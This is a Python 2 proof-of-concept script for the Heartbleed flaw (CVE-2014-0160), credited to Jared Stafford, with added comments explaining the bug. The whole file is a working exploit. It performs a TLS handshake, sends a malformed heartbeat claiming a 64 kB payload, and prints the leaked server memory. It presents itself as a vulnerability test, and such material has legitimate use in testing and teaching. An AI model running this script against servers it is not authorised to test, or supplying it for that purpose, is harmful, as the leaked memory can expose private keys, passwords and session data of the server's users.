#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
  
import sys
import struct
import socket
import time
import select
from optparse import OptionParser
  
# ClientHello
helloPacket = (
'16 03 02 00 31'    # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
'01 00 00 2d'       # Message type = 01 (client hello); Length = 00 00 2d

'03 02'             # Client version = 03 02 (TLS 1.1)

# Random (uint32 time followed by 28 random bytes):
'50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96'
'00'                # Session id = 00
'00 04 '            # Cipher suite length
'00 33 c0 11'       # 4 cipher suites
'01'                # Compression methods length
'00'                # Compression method 0: no compression = 0
'00 00'             # Extensions length = 0
).replace(' ', '').decode('hex')


 

# This is the packet that triggers the memory over-read.
# The heartbeat protocol works by returning to the client the same data that was sent;
# that is, if we send "abcd" the server will return "abcd".

# The flaw is triggered when we tell the server that we are sending a message that is X bytes long
# (64 kB in this case), but we send a shorter message; OpenSSL won't check if we really sent the X bytes of data.

# The server will store our message, then read the X bytes of data from its memory
# (it reads the memory region where our message is supposedly stored) and send that read message back.

# Because we didn't send any message at all
# (we just told that we sent FF FF bytes, but no message was sent after that)
# when OpenSSL receives our message, it wont overwrite any of OpenSSL's memory.
# Because of that, the received message will contain X bytes of actual OpenSSL memory.


heartbleedPacket = (
'18 03 02 00 03'    # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
'01 FF FF'          # Heartbeat message type = 01 (request); Payload length = FF FF
                    # Missing a message that is supposed to be FF FF bytes long
).replace(' ', '').decode('hex')



options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')


def dump(s):
    packetData = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in s)
    print '%s' % (packetData)
    
  
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        # Wait until the socket is ready to be read
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
          

# When you request the 64 kB of data, the server won't tell you that it will send you 4 packets.
# But you expect that because TLS packets are sliced if they are bigger than 16 kB.
# Sometimes, (for some misterious reason) the server wont send you the 4 packets;
# in that case, this function will return the data that DO has arrived.

def receiveTLSMessage(s, fragments = 1):
    contentType = None
    version = None
    length = None
    payload = ''

    # The server may send less fragments. Because of that, this will return partial data.
    for fragmentIndex in range(0, fragments):
        tlsHeader = recvall(s, 5) # Receive 5 byte header (Content type, version, and length)

        if tlsHeader is None:
            print 'Unexpected EOF receiving record header - server closed connection'
            return contentType, version, payload # Return what we currently have

        contentType, version, length = struct.unpack('>BHH', tlsHeader) # Unpack the header
        payload_tmp = recvall(s, length, 5) # Receive the data that the server told us it'd send

        if payload_tmp is None:
            print 'Unexpected EOF receiving record payload - server closed connection'
            return contentType, version, payload # Return what we currently have

        print 'Received message: type = %d, ver = %04x, length = %d' % (contentType, version, len(payload_tmp))

        payload = payload + payload_tmp

    return contentType, version, payload
    

def exploit(s):
    s.send(heartbleedPacket)
    
    # We asked for 64 kB, so we should get 4 packets
    contentType, version, payload = receiveTLSMessage(s, 4)
    if contentType is None:
        print 'No heartbeat response received, server likely not vulnerable'
        return False

    if contentType == 24:
        print 'Received heartbeat response:'
        dump(payload)
        if len(payload) > 3:
            print 'WARNING: server returned more data than it should - server is vulnerable!'
        else:
            print 'Server processed malformed heartbeat, but did not return any extra data.'
        return True

    if contentType == 21:
        print 'Received alert:'
        dump(payload)
        print 'Server returned error, likely not vulnerable'
        return False
  
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(helloPacket)
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    # Receive packets until we get a hello done packet
    while True:
        contentType, version, payload = receiveTLSMessage(s)
        if contentType == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if contentType == 22 and ord(payload[0]) == 0x0E:
            break
  
    print 'Sending heartbeat request...'
    sys.stdout.flush()
    
    # Jared Stafford's version sends heartbleed packet here too. It may be a bug.
    exploit(s)
  
if __name__ == '__main__':
    main()
